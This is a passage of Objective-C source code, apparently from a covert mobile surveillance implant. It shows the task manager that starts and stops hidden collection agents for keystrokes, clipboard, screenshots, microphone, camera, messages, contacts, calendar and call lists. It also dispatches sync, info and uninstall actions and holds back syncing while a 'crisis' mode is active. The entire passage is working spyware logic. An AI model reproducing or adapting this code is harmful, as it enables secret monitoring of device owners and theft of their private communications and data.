            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_URL
                             fromComponent: COMP_CORE])
              {
                [anObject setObject: AGENT_RUNNING forKey: @"status"];
              }
          
            [agentCommand release];
            break;
          }  
        case AGENT_KEYLOG:
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
          
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_KEYLOG
                             fromComponent: COMP_CORE])
              {
                [anObject setObject: AGENT_RUNNING forKey: @"status"];
              }
          
            [agentCommand release];
          
            break;
          }
        case AGENT_CLIPBOARD:
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;

            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_CLIPBOARD
                             fromComponent: COMP_CORE])
              {
                [anObject setObject: AGENT_RUNNING forKey: @"status"];
              }
          
            [agentCommand release];
            break;
          }
        case AGENT_APPLICATION:
          {
            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
            shMemoryHeader->commandDataSize = 0;
            
            if ([mSharedMemory writeMemory: agentCommand
                                    offset: OFFT_APPLICATION
                             fromComponent: COMP_CORE])
              {
                [anObject setObject: AGENT_RUNNING forKey: @"status"];
              }
          
            [agentCommand release];
            
            break;
          } 
        // Internal agents (threaded)
        case AGENT_MICROPHONE:
          {
            RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
            agentConfiguration = [[anObject objectForKey: @"data"] retain];
            
            if ([agentConfiguration isKindOfClass: [NSString class]])
              {
                // Hard error atm, think about default config parameters
                break;
              }
            else
              {
                [anObject setObject: AGENT_START forKey: @"status"];
                agentMicrophone.mAgentConfiguration = anObject;
              
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentMicrophone
                                       withObject: nil];
              }
            
            break;
          }
        case AGENT_MESSAGES:
          {
            RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
            agentConfiguration = [[anObject objectForKey: @"data"] retain];
            
            if ([agentConfiguration isKindOfClass: [NSString class]])
              {
                // Hard error atm, think about default config parameters
                break;
              }
            else
              {
                [anObject setObject: AGENT_START forKey: @"status"];
                
                agentMessages.mAgentConfiguration = anObject;
                
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentMessages
                                       withObject: nil];
              }
              
            break;
          }
        case AGENT_ORGANIZER:
          {
            RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
            RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
        
            [anObject setObject: AGENT_START forKey: @"status"];  
            
            agentAddress.mAgentConfiguration = anObject;
            agentCalendar.mAgentConfiguration = anObject;
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentAddress
                                   withObject: nil];
                                       
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCalendar
                                   withObject: nil];                
              
            break;
          }
        case AGENT_CRISIS:
          {
            gAgentCrisis = YES;

            RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
            [infoManager logActionWithDescription: @"Crisis started"];
            [infoManager release];
          
            break;
          }
        case AGENT_DEVICE:
          {
            RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
            agentConfiguration = [[anObject objectForKey: @"data"] retain];

            if ([agentConfiguration isKindOfClass: [NSString class]])
              {
                // Hard error atm, think about default config parameters
                break;
              }
            else
              {
                [anObject setObject: AGENT_START forKey: @"status"];
                
                agentDevice->mAgentConfiguration = anObject;

                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentDevice
                                       withObject: nil];
              }
            break;
          }
        case AGENT_CALL_LIST:
          {
            RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
            
            agentCallList.mAgentConfiguration = anObject;

            [anObject setObject: AGENT_START forKey: @"status"];
                
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCallList
                                   withObject: nil];
            break;
          }
        case AGENT_CAM:
          {
            RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
          
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
          
            [anObject setObject: AGENT_START forKey: @"status"];
            
            agentCamera->mAgentConfiguration = anObject;
        
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentCamera
                                   withObject: nil];
           
            break;
          }
        default:
          break;
        }
          
        if (agentConfiguration != nil)
          [agentConfiguration release];
      
      [status release];
      [innerPool release];
    }
  
  [outerPool release];
  
  return YES;
}

- (BOOL)stopAgents
{
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];

  NSMutableDictionary *anAgent;
  
  for (anAgent in mAgentsList)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      int agentID = [[anAgent objectForKey: @"agentID"] intValue];
      NSString *status = [[NSString alloc] initWithString: [anAgent objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
        {
          switch (agentID)
            {
            // External agents
            case AGENT_SCREENSHOT:
              {
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                shMemoryHeader->commandDataSize = 0;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_SCREENSHOT
                                 fromComponent: COMP_CORE] == TRUE)
                  {
                    [anAgent setObject: AGENT_STOPPED
                                 forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_KEYLOG:
              {
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_KEYLOG
                                 fromComponent: COMP_CORE] == TRUE)
                  {
                    [anAgent setObject: AGENT_STOP forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_CLIPBOARD:
              {
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_CLIPBOARD
                                 fromComponent: COMP_CORE] == TRUE)
                  {
                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_URL:
              {
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_URL
                                 fromComponent: COMP_CORE] == TRUE)
                  {
                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_APPLICATION:
              {
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_APPLICATION
                                 fromComponent: COMP_CORE] == TRUE)
                  {
                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];  
                  }
                
                [agentCommand release];
                
                break;
              } 
            // Internal agents (threaded)
            case AGENT_MICROPHONE:
              {
                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
                
                if ([agentMicrophone stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Microphone");
#endif
                  }
                else
                  {
                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
                  }
                
                break;
              }             
            case AGENT_MESSAGES:
              {
                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
                
                if ([agentMessages stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Messages");
#endif
                  }
                
                break;
              }
            case AGENT_ORGANIZER:
              {
                RCSIAgentCalendar *agentCalendar = [RCSIAgentCalendar sharedInstance];
                
                if ([agentCalendar stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
                  }
                
                break;
              }
            case AGENT_ADDRESSBOOK:
              {
                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
              
                if ([agentAddress stop] == FALSE)
                  {
#ifdef DEBUG
                  NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
                  }
              
                break;
              }
            case AGENT_CRISIS:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
#endif
                gAgentCrisis = NO;

                RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
                [infoManager logActionWithDescription: @"Crisis stopped"];
                [infoManager release];
              
                break;
              }
            case AGENT_DEVICE:
              {
                RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];

                if ([agentDevice stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Device");
#endif
                  }

                break;
              }
            case AGENT_CALL_LIST:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Call List");
#endif
                RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];

                if ([agentCallList stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Call List");
#endif
                  }

                break;
              }
            case AGENT_CAM:
              {
                RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
              
                if ([agentCamera stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Camera");
#endif
                  }
              
                break;
              }
            default:
              {
                break;
              }
            }
        }
      
      [status release];
      [innerPool release];
      
      usleep(50000);
    }
  
  [outerPool release];
  
  return YES;
}

#pragma mark -
#pragma mark Monitors
#pragma mark -

- (BOOL)startEvents
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  id theEvent;
  int eventPos = 0;
  
  RCSIEvents *events = [RCSIEvents sharedInstance];
  
  NSEnumerator *enumerator = [mEventsList objectEnumerator];
  
  while ((theEvent = [enumerator nextObject]))
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      switch ([[theEvent threadSafeObjectForKey: @"type"
                                      usingLock: gTaskManagerLock] intValue])
        {
        case EVENT_TIMER:
          {
            // timers with NSTimer
            [events addEventTimerInstance: theEvent];
            break;
          }
        case EVENT_PROCESS:
          {
            [events addEventProcessInstance: theEvent];
            break;
          }
        case EVENT_CONNECTION:
          {
            [events addEventConnectivityInstance:theEvent];
            break; 
          }
        case EVENT_BATTERY:
          {
            [events addEventBatteryInstance:theEvent];
            break;
          }
        case EVENT_AC:
          {
            [events addEventACInstance:theEvent];
            break;
          }
        case EVENT_STANDBY:
          {
#ifdef JSON_CONFIG
            [events addEventScreensaverInstance:theEvent];
            [events startEventStandBy: eventPos];
#else
            // start remote events (triggered in SBApplication)
            [events eventStandBy: theEvent];
#endif
            break;
          }
        case EVENT_SIM_CHANGE:
          {
#ifdef JSON_CONFIG
            [events addEventSimChangeInstance:theEvent];
#else
            // start remote events (triggered in SBApplication)
            [events eventSimChange:theEvent];
#endif
            break;
          }
        case EVENT_SMS:
          {
            break;
          }
        case EVENT_CALL:
          {
              break;
          }
        case EVENT_QUOTA:
          {
            break;
          }
        default:
          {
            break;
          }
        }
      
      eventPos++;
      
      [innerPool release];
    }

  [outerPool release];
  
  return TRUE;
}

- (BOOL)stopEvents
{
  id anObject;
#ifndef JSON_CONFIG
  int counter   = 0;
#endif
  int errorFlag = 0;
  
  for (anObject in mEventsList)
    {
      // set local status flag... 
      [anObject setValue: EVENT_STOP forKey: @"status"];
    
      // stop remote events monitors and set manually status flag...
      switch ([[anObject threadSafeObjectForKey: @"type"
                                      usingLock: gTaskManagerLock] intValue])
        {
          case EVENT_SIM_CHANGE:
          {
            // 
            NSMutableData *simChangeComm = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[simChangeComm bytes];
            shMemoryHeader->agentID         = OFFT_SIMCHG;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_STOP;
            shMemoryHeader->commandDataSize = 0;
            
            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
            
            if ([mSharedMemoryCommand writeMemory: simChangeComm
                                           offset: OFFT_SIMCHG
                                    fromComponent: COMP_CORE])
              {
#ifdef DEBUG
                NSLog(@"%s: sending simchange command to dylib: done!", __FUNCTION__);
#endif
              }
            else 
              {
#ifdef DEBUG
                NSLog(@"%s: sending simchange command to dylib: error!", __FUNCTION__);
#endif
              }
            
            [simChangeComm release]; 
            
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
          case EVENT_STANDBY:
          {
            // 
            NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
            shMemoryHeader->agentID         = OFFT_STANDBY;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_STOP;
            shMemoryHeader->commandDataSize = 0;
            
            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
   
            if ([mSharedMemoryCommand writeMemory: standByCommand
                                           offset: OFFT_STANDBY
                                    fromComponent: COMP_CORE])
            {
#ifdef DEBUG
              NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
#endif
            }
            else 
            {
#ifdef DEBUG
              NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
#endif
            }
            
            [standByCommand release]; 
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
        }
#ifdef JSON_CONFIG
      //do nothing: events are timers... status stopped in [eventManager stop]
#else    
      // wait for threads monitor events exit
      while ([anObject objectForKey: @"status"] != EVENT_STOPPED
             && counter <= MAX_WAIT_TIME)
        {
          sleep(1);
          counter++;
        }
      
      // checking the timeout: there are possibile monitor thread already running
      if (counter == MAX_WAIT_TIME)
        errorFlag = 1;
      
      counter = 0;
#endif
    }
  
  if (errorFlag == 0)
    return TRUE;
  else
    return FALSE;
}

- (BOOL)startEventsMonitors
{
  // Start events monitoring thread
  [NSThread detachNewThreadSelector: @selector(startEvents)
                           toTarget: self
                         withObject: nil];
  return TRUE;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (BOOL)triggerAction: (int)anActionID
{
  BOOL aBVal;
  
  NSArray *configArray = [self getConfigForAction: anActionID withFlag: &aBVal];
  NSMutableDictionary *configuration;
  
#ifdef DEBUG
  NSLog(@"configArray: %@", configArray);
#endif

  for (configuration in configArray)
    {
      int32_t type = [[configuration objectForKey: @"type"] intValue];
      switch (type)
        {
#if 0
        case ACTION_SYNC_APN:
            {
#ifdef DEBUG
              NSLog(@"Starting action Sync APN");
#endif

              if ([[configuration objectForKey: @"status"] intValue] == 0)
                {
                  if (gAgentCrisis == NO) 
                    {
#ifdef DEBUG
                      NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
#endif
                      NSNumber *status = [NSNumber numberWithInt: 1];
                      [configuration setObject: status forKey: @"status"];

                      [mActions actionSyncAPN: configuration];
                    }
                  else 
                    {
#ifdef DEBUG
                      NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
#endif
                    }
                }
              break;
            }
#endif
        case ACTION_SYNC:
          {
#ifdef DEBUG_
            NSLog(@"Starting action Sync");
#endif

            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                if (gAgentCrisis == NO) 
                  {
#ifdef DEBUG
                    NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
#endif
                    NSNumber *status = [NSNumber numberWithInt: 1];
                    [configuration setObject: status forKey: @"status"];

                    [mActions actionSync: configuration];
                  }
                else 
                  {
#ifdef DEBUG
                    NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
#endif
                  }
              }
            break;
          }
        case ACTION_AGENT_START:
          {
            // Maybe call directly startAgent form TaskManager here instead of passing
            // through RCSMActions

            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
#ifdef DEBUG_
                NSLog(@"AGENT START");
#endif

                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [mActions actionAgent: configuration start: TRUE];
              }

            break;
          }
        case ACTION_AGENT_STOP:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [mActions actionAgent: configuration start: FALSE];
              }

            break;
          }
        case ACTION_UNINSTALL:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [mActions actionUninstall: configuration];
              }

            break;
          }
        case ACTION_INFO:
          {
#ifdef DEBUG_
            NSLog(@"Starting info action");
#endif
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [mActions actionInfo: configuration];
                status = [NSNumber numberWithInt: 0];
                [configuration setObject: status forKey: @"status"];
              }

            break;
          }
        default:
          {
#ifdef DEBUG_
            NSLog(@"Unknown actionID (%d)", type);
#endif
            break;
          }
        }
    }

  return TRUE;
}

#pragma mark -
#pragma mark Registering functions for events/actions/agents
#pragma mark -

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering event type %d", aType);
#endif
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *type = [NSNumber numberWithUnsignedInt: aType];
  NSNumber *action = [NSNumber numberWithUnsignedInt: actionID];
  
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"type", @"actionID", @"data",
                                    @"status", @"monitor", nil];
  
  if (eventData == nil)
    {
      objects = [NSArray arrayWithObjects: type, action, @"",
                                           EVENT_START, @"", nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: type, action, eventData,
                                           EVENT_START, @"", nil];
    }
  
#ifdef DEBUG_VERBOSE_1
  NSLog(@"EventData: %@", eventData);
#endif
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  @synchronized(self)
  {
    [mEventsList addObject: eventConfiguration];
  }
  
  return YES;
}

- (BOOL)unregisterEvent: (u_int)eventID
{
  return YES;
}

- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID
{
#ifdef DEBUG
  NSLog(@"Registering action ID (%d) with type (%d) content (%@)", actionID, actionType, actionData);
#endif
  NSMutableDictionary *actionConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *action = [NSNumber numberWithUnsignedInt: actionID];
  NSNumber *type = [NSNumber numberWithUnsignedInt: actionType];
  NSNumber *status = [NSNumber numberWithInt: 0];
  
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"actionID", @"type", @"data", @"status", nil];
  
  if (actionData == nil)
    {
      objects = [NSArray arrayWithObjects: action, type, @"", status, nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: action, type, actionData, status, nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [actionConfiguration addEntriesFromDictionary: dictionary];
  
  [mActionsList addObject: actionConfiguration];
  
  return YES;
}

- (BOOL)unregisterAction: (u_int)actionID
{
  return YES;
}

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
        (status == 2 ) ? @"activated" : @"deactivated", agentData);
#endif
  
  NSMutableDictionary *agentConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *tempID = [NSNumber numberWithUnsignedInt: agentID];
  
  NSString *agentState = (status == 2) ? AGENT_ENABLED : AGENT_DISABLED;
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  if (agentData == nil)
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           @"",
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           agentData,
                                           nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [agentConfiguration addEntriesFromDictionary: dictionary];
  [mAgentsList addObject: agentConfiguration];
  
  return YES;  
}

- (BOOL)unregisterAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)registerParameter: (NSData *)confData
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering conf parameter x, cool");
#endif
  
  [mGlobalConfiguration addObject: confData];
  
  return TRUE;
}

- (BOOL)unregisterParameter: (NSData *)confData
{
  return TRUE;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSArray *)getConfigForAction: (u_int)anActionID withFlag:(BOOL*)concurrent
{  
#define ACTION_SUBACT_KEY @"subactions"  
  
  *concurrent = FALSE;
  
  NSArray *subactions = nil;

  @synchronized(self)
  {
    NSDictionary *subaction = [mActionsList objectAtIndex:anActionID];
    
    if (subaction != nil)
      {
        subactions     = [[subaction objectForKey: ACTION_SUBACT_KEY] retain];
        NSNumber *flag = [subaction objectForKey:@"concurrent"];
        
        if (flag != nil && [flag boolValue] == TRUE)
          *concurrent = TRUE;
      }
  }

  return subactions;
}

- (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"getConfigForAgent called %x", anAgentID);
#endif
  
  NSMutableDictionary *anObject;
  
  for (anObject in mAgentsList)
    {
      if ([[anObject threadSafeObjectForKey: @"agentID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anAgentID)
        {
#ifdef DEBUG
          NSLog(@"Agent %d found", anAgentID);
#endif
          return anObject;
        }
    }
  
#ifdef DEBUG
  NSLog(@"Agent %d not found", anAgentID);
#endif
  
  return nil;
}

// EventsManager, ConfManager get copy of the running
// list and retain it til used
- (NSMutableArray*)getCopyOfEvents
{
  NSMutableArray *events = nil;
  
  @synchronized(self)
  {
    events = [mEventsList copy];
  }
  
  return events;
}

- (void)removeAllElements
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  @synchronized(self)
  {
//    [mEventsList removeAllObjects];
//    [mActionsList removeAllObjects];
//    [mAgentsList removeAllObjects];

    int cout = [mEventsList count];
    
    for (int i=cout-1;i>=0;i--) 
    {
      id oi = [mEventsList objectAtIndex:i];
      if (oi == nil)
        break;
      [mEventsList removeObjectAtIndex:i];
    }
    
    cout = [mActionsList count];
    
    for (int i=cout-1;i>=0;i--) 
    {
      id oi = [mActionsList objectAtIndex:i];
      if (oi == nil)
        break;
      [mActionsList removeObjectAtIndex:i];
    }
    
    cout = [mAgentsList count];
    
    for (int i=cout-1;i>=0;i--) 
    {
      id oi = [mAgentsList objectAtIndex:i];
      if (oi == nil)
        break;
      [mAgentsList removeObjectAtIndex:i];
    }
  }
  
  [pool release];
}

@end
